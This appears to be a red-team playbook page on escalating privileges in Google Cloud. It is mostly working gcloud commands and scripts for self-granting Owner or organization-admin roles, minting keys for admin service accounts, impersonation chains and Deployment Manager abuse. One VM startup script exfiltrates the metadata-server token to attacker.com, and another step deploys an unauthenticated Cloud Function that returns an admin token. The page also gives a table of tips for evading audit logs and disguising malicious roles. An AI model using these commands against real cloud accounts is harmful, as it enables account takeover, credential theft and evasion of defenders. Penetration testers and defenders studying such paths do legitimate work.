# GCP Privilege Escalation
> **MITRE ATT&CK**: Privilege Escalation > T1078.004 - Valid Accounts: Cloud Accounts
> **Platforms**: GCP (Google Cloud Platform)
> **Required Privileges**: Low to Medium
> **OPSEC Risk**: Medium

## Strategic Overview

GCP privilege escalation exploits the granular IAM permission model where individual
permissions (not just roles) determine what actions are possible. The most dangerous
permissions are those that allow modifying IAM policies (setIamPolicy), creating
service account keys, or impersonating service accounts (actAs). GCP's IAM model uses
a resource hierarchy (Organization > Folder > Project > Resource) where permissions
inherit downward, meaning a single overprivileged binding at the organization level
cascades to every project. A red team lead must map the IAM hierarchy before attempting
escalation.

## Technical Deep-Dive

### setIamPolicy -- The Master Permission

```bash
# If you have resourcemanager.projects.setIamPolicy, you own the project
# Self-grant Owner role
gcloud projects get-iam-policy TARGET_PROJECT --format=json > policy.json

# Edit policy.json to add your identity with roles/owner
# Add to "bindings" array:
# {
#   "role": "roles/owner",
#   "members": ["serviceAccount:compromised-sa@project.iam.gserviceaccount.com"]
# }

gcloud projects set-iam-policy TARGET_PROJECT policy.json

# Organization-level setIamPolicy = control everything
gcloud organizations get-iam-policy ORG_ID --format=json > org-policy.json
# Add roles/resourcemanager.organizationAdmin for yourself
gcloud organizations set-iam-policy ORG_ID org-policy.json

# Folder-level escalation (control all projects in the folder)
gcloud resource-manager folders get-iam-policy FOLDER_ID --format=json > folder-policy.json
gcloud resource-manager folders set-iam-policy FOLDER_ID folder-policy.json
```

### Service Account Key Creation

```bash
# iam.serviceAccountKeys.create - Create keys for any SA you can target
# Find high-privilege service accounts
gcloud iam service-accounts list --format="table(email,displayName)"

# Check what roles are bound to each SA
gcloud projects get-iam-policy TARGET_PROJECT \
  --flatten="bindings[].members" \
  --filter="bindings.members:serviceAccount" \
  --format="table(bindings.role,bindings.members)"

# Create a key for a high-privilege SA
gcloud iam service-accounts keys create stolen-key.json \
  --iam-account=admin-sa@target-project.iam.gserviceaccount.com

# Authenticate with the stolen key
gcloud auth activate-service-account --key-file=stolen-key.json

# Verify escalated access
gcloud projects get-iam-policy TARGET_PROJECT
```

### actAs + Compute Instance Creation

```bash
# iam.serviceAccounts.actAs + compute.instances.create
# Launch a VM with a high-privilege SA attached

gcloud compute instances create escalation-vm \
  --zone=us-central1-a \
  --service-account=admin-sa@target-project.iam.gserviceaccount.com \
  --scopes=cloud-platform \
  --metadata=startup-script='#!/bin/bash
TOKEN=$(curl -s -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | python3 -c "import sys,json;print(json.load(sys.stdin)[\"access_token\"])")
curl -X POST https://attacker.com/token -d "token=$TOKEN"'

# SSH into the instance and use the SA token directly
gcloud compute ssh escalation-vm --zone=us-central1-a
# Inside the VM:
gcloud auth list
gcloud projects get-iam-policy TARGET_PROJECT  # Now with admin SA privileges
```

### actAs + Cloud Functions

```bash
# cloudfunctions.functions.create + iam.serviceAccounts.actAs
# Deploy a function that runs as a high-privilege SA

cat > /tmp/main.py << 'PYEOF'
import google.auth
import google.auth.transport.requests
import json

def escalate(request):
    credentials, project = google.auth.default()
    credentials.refresh(google.auth.transport.requests.Request())
    return json.dumps({
        'token': credentials.token,
        'project': project,
        'service_account': credentials.service_account_email
    })
PYEOF

cat > /tmp/requirements.txt << 'EOF'
google-auth
EOF

gcloud functions deploy escalation-func \
  --runtime=python39 \
  --trigger-http \
  --allow-unauthenticated \
  --service-account=admin-sa@target-project.iam.gserviceaccount.com \
  --source=/tmp/ \
  --entry-point=escalate

# Invoke the function to retrieve the admin SA token
curl "https://REGION-PROJECT.cloudfunctions.net/escalation-func"
```

### Deployment Manager Abuse

```bash
# deploymentmanager.deployments.create - Deploy resources as Project Editor SA
# Deployment Manager runs as: PROJECT_NUMBER@cloudservices.gserviceaccount.com
# This SA typically has roles/editor on the project

cat > /tmp/deployment.yaml << 'EOF'
resources:
- name: escalation-sa-binding
  type: gcp-types/cloudresourcemanager-v1:virtual.projects.iamMemberBinding
  properties:
    resource: TARGET_PROJECT
    role: roles/owner
    member: serviceAccount:compromised-sa@target-project.iam.gserviceaccount.com
EOF

gcloud deployment-manager deployments create escalation \
  --config=/tmp/deployment.yaml

# The Deployment Manager SA adds Owner role to your compromised SA
```

### Custom Role Creation with Escalated Permissions

```bash
# If you have iam.roles.create at project or org level
gcloud iam roles create customEscalation \
  --project=TARGET_PROJECT \
  --title="Security Auditor" \
  --description="Extended audit capabilities" \
  --permissions="iam.serviceAccountKeys.create,\
iam.serviceAccounts.actAs,\
resourcemanager.projects.setIamPolicy,\
compute.instances.create,\
storage.objects.get,\
storage.objects.list"

# Assign the custom role to yourself
gcloud projects add-iam-policy-binding TARGET_PROJECT \
  --member="serviceAccount:compromised-sa@target-project.iam.gserviceaccount.com" \
  --role="projects/TARGET_PROJECT/roles/customEscalation"
```

### Organization-Level IAM Binding Abuse

```bash
# If you have org-level permissions, escalation affects all projects

# Check org-level bindings
gcloud organizations get-iam-policy ORG_ID \
  --format="table(bindings.role,bindings.members)"

# Add org-level admin binding
gcloud organizations add-iam-policy-binding ORG_ID \
  --member="serviceAccount:compromised-sa@project.iam.gserviceaccount.com" \
  --role="roles/resourcemanager.organizationAdmin"

# Folder-level escalation (affects all projects in folder)
gcloud resource-manager folders add-iam-policy-binding FOLDER_ID \
  --member="user:attacker@gmail.com" \
  --role="roles/editor"
```

### Service Account Impersonation Chain

```bash
# iam.serviceAccounts.getAccessToken - Impersonate without key creation
# Less detectable than creating keys (no persistent credential artifact)

# Direct impersonation
gcloud auth print-access-token --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com

# Chained impersonation: SA-A -> SA-B -> SA-C (target)
gcloud auth print-access-token \
  --impersonate-service-account=target-sa@project.iam.gserviceaccount.com \
  --impersonate-service-account=intermediate-sa@project.iam.gserviceaccount.com

# Use impersonated token directly
TOKEN=$(gcloud auth print-access-token --impersonate-service-account=admin-sa@project.iam.gserviceaccount.com)
curl -H "Authorization: Bearer $TOKEN" \
  "https://cloudresourcemanager.googleapis.com/v1/projects/TARGET_PROJECT"
```

### Automated Escalation Tooling

```bash
# GCP IAM Privilege Escalation scanner
# https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
python3 PrivEscScanner/check_for_privesc.py \
  --project TARGET_PROJECT \
  --service-account-credentials stolen-key.json

# Gato - GitHub Actions exploitation (can pivot to GCP via WIF)
# If GitHub Actions uses Workload Identity Federation to GCP
gato enumerate --target target-org
gato attack --target target-org/target-repo

# Manual enumeration of escalation permissions
gcloud iam service-accounts get-iam-policy admin-sa@project.iam.gserviceaccount.com
# Look for: iam.serviceAccountKeys.create, iam.serviceAccounts.actAs,
# iam.serviceAccounts.getAccessToken, iam.serviceAccountTokenCreator
```

## Detection & Evasion

| Escalation Method              | Cloud Audit Log Event                | Evasion                              |
|--------------------------------|--------------------------------------|--------------------------------------|
| setIamPolicy                   | SetIamPolicy (Admin Activity)        | Minimal change; add one binding      |
| SA key creation                | CreateServiceAccountKey              | Use impersonation instead of keys    |
| VM with SA                     | instances.insert + actAs             | Use existing instance types/names    |
| Function deployment            | functions.create                     | Name to match existing patterns      |
| Custom role creation           | CreateRole                           | Use innocuous role name/description  |
| Impersonation                  | GenerateAccessToken                  | Short-lived; no persistent artifact  |

```bash
# Check if Data Access Audit Logs are enabled (they often are not by default)
gcloud projects get-iam-policy TARGET_PROJECT --format=json | \
  python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d.get('auditConfigs',[]),indent=2))"
```

## 2025 Techniques

### Default Service Account Abuse (Datadog, 2025)

```
# Datadog Security Labs research
# MITRE: T1078.004 / T1552.005

# Key finding: 28% of GKE clusters don't enable Workload Identity Federation
# Pods can access worker nodes' full credentials via metadata server

# When VMs created with Compute Engine default SA + cloud-platform scope:
# Credentials from metadata server effectively have admin access
# at the project level

# Metadata server: 169.254.169.254
# Retrieves service account names and temporary credentials

# Google blocked default SA auto-attachment as of May 2024
# BUT legacy environments remain vulnerable

# Attack path:
# 1. Compromise pod in GKE cluster without WIF
# 2. Access metadata server at 169.254.169.254
# 3. Retrieve worker node's service account token
# 4. Use token for project-level access
```

### GKE Workload Identity Federation Internals

```
# When WIF IS enabled, pod requests to IMDS are redirected
# to 169.254.169.252:988 (gke-metadata-server on the node)
# Kubernetes-issued identity token exchanged for Google Cloud
# access token via Google's STS

# Security gap: Pods WITHOUT WIF can still access the worker
# node's full credentials, bypassing the WIF protection
# for other pods on the same node
```

### Cloud Functions Admin -- Full Project Takeover

```
# Nairuz Abulhul / R3d Buck3T (2025)
# MITRE: T1548 / T1648

# cloudfunctions.admin role enables full project takeover:
# 1. Create Cloud Function running as default Compute Engine SA
#    (SA often has Editor-level permissions at project level)
# 2. Function accesses metadata server for access token
# 3. Use token to escalate to project-level administrator

# This path works because:
# - Default Compute Engine SA has Editor permissions (common)
# - Cloud Functions inherit the SA's full permissions
# - No additional IAM bindings needed beyond cloudfunctions.admin
```

### Domain-Wide Delegation Escalation

```
# Praetorian / Rhino Security Labs (2025 continued research)
# MITRE: T1078.004 / T1134

# Domain-wide delegation does NOT restrict impersonation to
# a particular user -- allows impersonation of ANY user in
# Cloud Identity or Google Workspace, including super-admins

# If IAM bindings for SAs set at project level rather than
# SA level: users can impersonate ANY SA in the project

# Cloud Functions admin escalation via domain-wide delegation:
# 1. Deploy function as SA with domain-wide delegation
# 2. Function impersonates Workspace super-admin
# 3. Full organizational control achieved
```

### Kubernetes RBAC Escalation Paths

```
# Sweet Security / Unit42 / SCHUTZWERK (2025-2026)
# MITRE: T1548 / T1078

# nodes/proxy GET privilege escalation:
# K8s authorizes WebSocket requests for pod exec based solely on GET verb
# Principal with nodes/proxy GET can exec without pods/exec permission
# Collapses multiple trust boundaries within the cluster

# Additional RBAC escalation patterns:
# - create pods -> create privileged pods or hostPath mounts
# - Pods can mount SA tokens within namespace
# - Impersonate high-privilege service accounts

# GKE-specific CVEs (2025):
# CVE-2025-15467, CVE-2025-39964, CVE-2025-40215, CVE-2025-40214
```

## Cross-References

- [GCP Initial Access](gcp-initial-access.md)
- [GCP Persistence](gcp-persistence.md)
- [Cloud Attack Methodology](../cloud-methodology.md)
- [Cloud Tools Reference](../cloud-tools.md)

## References

- https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-1/
- https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges/
- https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation
- https://cloud.google.com/iam/docs/understanding-roles
- Datadog GCP Research: https://securitylabs.datadoghq.com/articles/gcp-default-service-account/
- GKE Workload Identity: https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity
- Cloud Functions Escalation: https://rhinosecuritylabs.com/gcp/privilege-escalation-google-cloud-platform-part-2/
